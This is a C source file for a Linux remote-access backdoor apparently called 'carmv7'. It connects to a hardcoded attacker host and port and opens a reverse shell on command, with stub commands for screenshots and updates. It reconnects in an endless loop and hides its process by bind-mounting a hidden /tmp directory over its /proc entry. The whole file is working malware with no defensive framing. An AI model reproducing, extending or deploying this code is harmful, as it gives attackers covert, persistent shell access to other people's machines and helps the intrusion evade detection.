//FILE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>

//NETWORK
#include<sys/socket.h>
#include<arpa/inet.h>
#include <netdb.h>

//UTIL
#include<stdio.h>
#include<string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

#define BUF_SIZE 255
#define SHELL_CMD "sh"
#define DEFAULT_HOST "***.***.***.***"
#define DEFAULT_PORT 6668
#define APPNAME "carmv7"

#define DEBUG 1
#if DEBUG
#define LOG(a) printf a
#else
#define LOG(a) (void)0
#endif

#define ARRAY_SIZE(x) (sizeof(x) / sizeof(x[0]))
#define MEMSET_ARRAY(x) memset(x, 0x00, ARRAY_SIZE(x))

int is_terminated = 0;
 
void child_sig_handler(int signum)
{
    if (signum == SIGCHLD)
    {
        is_terminated = 1;
    }
}

int socket_OK=0;

void sigpipe_handler()
{
    printf("SIGPIPE caught\n");
    socket_OK=0;
	// signal(SIGPIPE,NULL);
	// signal(SIGPIPE, SIG_IGN);
}

//EXECUTE SHELL
void shell(int socket){
    
	struct sigaction sa;
    pid_t child_pid;
    is_terminated = 0;

    sa.sa_handler = child_sig_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    if(sigaction(SIGCHLD, &sa, NULL) == -1){
        printf("Child process child_sig_handler bind fail,exit!\n");
		return;
	}
 
    if((child_pid = fork()) == -1){
        printf("Child process fork fail,exit!\n");
		return;
	}

    if (child_pid == 0)
    {
        close(0);
		dup(socket);
		close(1);
		dup(socket);
		close(2);
		dup(socket);
		char* arg[] = {SHELL_CMD, NULL};
		execvp(arg[0], arg);
        exit(0);
    }
 
    while (!is_terminated)
    {
        // printf("Child process has not terminated,sleep 3 s!\n");
        sleep(3);
    }
	printf("out shell!\n");
	return;
	
}


// RETURN A FILE DESCRIPTOR ASSOCIATED TO SERVER
int connect_to_server(char *hostname,int port){
	int socket_desc=0;
	struct sockaddr_in server;

	//CREATE SOCKET
	socket_desc = socket(AF_INET , SOCK_STREAM , 0);
	if (socket_desc == -1)
	{
		printf("Could not create socket");
		return -1;
	}
	//GET ADRESS FROM HOSTNAME
	struct hostent *he = gethostbyname(hostname);	
	memcpy(&server.sin_addr, he->h_addr_list[0], he->h_length);	
	server.sin_family = AF_INET;
	server.sin_port = htons(port);

	//CONNECT TO REMOTE SERVER
	if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0)
	{
		perror("connect error");
		return -1;
	}
	printf("Connected\n");
	return socket_desc;
}

char get_client_choice(int socket){
	char choix = 0;
	char buffer[255];
	while(choix == 0){
		// fputs(">>",f);
		if (recv(socket, buffer, BUF_SIZE, 0)!=0){
		// if(fgets(buffer, BUF_SIZE, f) != NULL){
			if (strlen(buffer)>0){
				choix=buffer[0];
			} 
			
		}else{
			choix='q';
		}
	}
	return choix;
}

int handle_main(char *host,int port){
    int socket_client=0;
	socket_client=connect_to_server(host,port);
	if (socket_client<0){
		return -1;
	}
    socket_OK = 1;
	signal(SIGPIPE,sigpipe_handler);

	// FILE *f = fdopen(socket_client, "r+");

	for(;;){
        if (socket_OK!=1){
			printf("out handle_main\n");
			break;
		}
		int cmd_code = get_client_choice(socket_client);
		switch(cmd_code){
			case 's':
				printf("choose shell\n");
				shell(socket_client);	
				printf("out out shell\n");
			    socket_OK = 0;		
			break;
			case 'u':
				printf("choose screenshot\n");
			break;
			case 'i':
				printf("choose update\n");
			break;
			case 'q':
				printf("Got stop code,exit!!\n");
				close(socket_client);
				return 0;
			break;
		}
	}
}
int fcntlfile(int fd, int cmd, int type, off_t offset, int whence, off_t len)
{
        struct flock lock;
        int n=0;

        lock.l_type=type;
        lock.l_start=offset;
        lock.l_whence=whence;
        lock.l_len=len;

        if((n=fcntl(fd, cmd, &lock))<0)
        {
            printf("fcntl error\n");
            return  -1;
        }
        return n;
}
int run_cmd_get_resp(char *cmd, char *cmd_respond)
{
    FILE *pp;
    int pipefd[2];
    int is_fork = 0, pid, ret_len;
    char buf[1] = "9"; //magic number for init
    if ((cmd[strlen(cmd) - 1]) == '&')
    {
        LOG(("cmd end with & !!,fork to run.\n"));
        // is_fork = 1;
        cmd[strlen(cmd) - 1] = '\0';
        pid = fork();
        if (pid == 0)
        {
            system(cmd);
            exit(EXIT_SUCCESS);
            return 0;
        }
        else
        {
            return 0;
        }
    }
    pp = popen(cmd, "r");
    if (pp != NULL)
    {
        while (1)
        {
            char *line;
            char buf[2048];
            MEMSET_ARRAY(buf);
            line = fgets(buf, sizeof buf, pp);
            int nTempLen = strlen(buf);
            if (line == NULL)
                break;
            else
            {
                if (nTempLen > 0 && '\n' == buf[nTempLen - 1])
                {
                    buf[nTempLen - 1] = 0;
                }
                strcat(cmd_respond, line);
            }
        }
        return pclose(pp);
    }
    return -1;
}

char *find_target_str(char const *const original, char const *const pattern1, char const *const pattern2)
{

    const char *p1_locate = strstr(original, pattern1);
    const size_t p1_len = strlen(pattern1);

    char *p2_locate = strstr(p1_locate + p1_len, pattern2);

    // find the target string len, drop paterns str
    size_t pattern_len = (p2_locate - p1_locate) - p1_len;
    // allocate memory for the target string
    char *target_name = (char *)malloc(sizeof(char) * (pattern_len + 1));
    //copy out target str between pattern1 and pattern2
    strncpy(target_name, p1_locate + p1_len, pattern_len);
    target_name[pattern_len] = '\0';
    return target_name;
}

int check_process_isrunning(char *appname)
{
    char cmd[256];
    char cmd_ret[256];
    int ret = -1;
    int ret_wx = -1;
    int ret_nx = -1;
    int index1, index2;
    char p_pid[6];
    MEMSET_ARRAY(p_pid);
    MEMSET_ARRAY(cmd_ret);
    sprintf(cmd, "pidof -x %s > /dev/null", appname);
    ret_wx = system(cmd);
    sprintf(cmd, "pidof %s > /dev/null", appname);
    ret_nx = system(cmd);
    if (0 == ret_wx || 0 == ret_nx)
    {
        LOG(("%s is running.\n", appname));
        MEMSET_ARRAY(cmd);
        if (ret_wx==0)
            sprintf(cmd, "pidof -x %s", appname);
        else if (ret_nx == 0)
            sprintf(cmd, "pidof %s", appname);

        run_cmd_get_resp(cmd, p_pid);
        MEMSET_ARRAY(cmd);
        sprintf(cmd, "/proc/%s", p_pid);
        if (access(cmd, F_OK) == 0)
        {
            MEMSET_ARRAY(cmd);
            sprintf(cmd, "mkdir -p /tmp/.%s && mount -o bind /tmp/.%s  /proc/%s", appname, appname, p_pid);
            system(cmd);
        }
        ret = 0;
    }
    else
    {
        sprintf(cmd, "cat /proc/$$/mountinfo | grep %s | tail -1", appname);
        run_cmd_get_resp(cmd, cmd_ret);
        LOG(("%s ret is:%s\n", cmd, cmd_ret));
        if (strlen(cmd_ret) < strlen(appname))
        {
            LOG(("%s is NOT running.\n", appname));
            ret = 1;
        }
        else
        {
            sprintf(p_pid, find_target_str(cmd_ret, "/proc/", " rw"));
            sprintf(cmd, "/proc/%s", p_pid);
            LOG(("check %s weather is running...[%s]\n", appname, cmd));
            if (access(cmd, F_OK) == 0)
            {
                LOG(("%s is running.\n", appname));
                ret = 0;
            }
            else
            {
                LOG(("%s is NOT running.\n", appname));
                ret = 1;
            }
        }
    }
    return ret;
}


int main(int argc, char **argv) {
	char *host;
    int port;
    
	FILE *fl = fopen("/tmp/lll", "w+");
	close(fl);
	fl = open("/tmp/lll", O_RDWR);
	if (fcntlfile(fl, F_SETLK, F_WRLCK,0, SEEK_SET, 0)<0){
		printf("another run,quit!\n");
		return -1;
	}
    check_process_isrunning(APPNAME);
	if(argc > 2){
		host = argv[1];
		port = atoi(argv[2]);
	}
	else{
		host = DEFAULT_HOST;
		port = DEFAULT_PORT;
	}
	for(;;){
		handle_main(host,port);
		sleep(6);
		printf("try connect again!\n");
	}
	return 0;
}
